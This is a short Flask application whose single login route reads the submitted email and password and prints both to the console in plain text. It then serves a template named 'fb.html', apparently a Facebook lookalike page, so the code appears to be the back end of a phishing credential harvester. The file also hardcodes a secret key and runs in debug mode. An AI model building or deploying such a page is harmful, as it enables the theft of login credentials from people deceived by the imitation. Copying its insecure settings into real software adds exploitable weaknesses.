from flask import Flask, render_template, request, redirect, url_for, flash
app = Flask(__name__)
app.config['SECRET_KEY'] = 'ase,o fyi.tuwey u jhvy euxf nhxd gj,'
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        print(f"Email: {email}, Password: {password}")
        if not email == "email" :
            return render_template("fb.html")
    return render_template('login.html')
if __name__ == '__main__':
    app.run(debug=True)
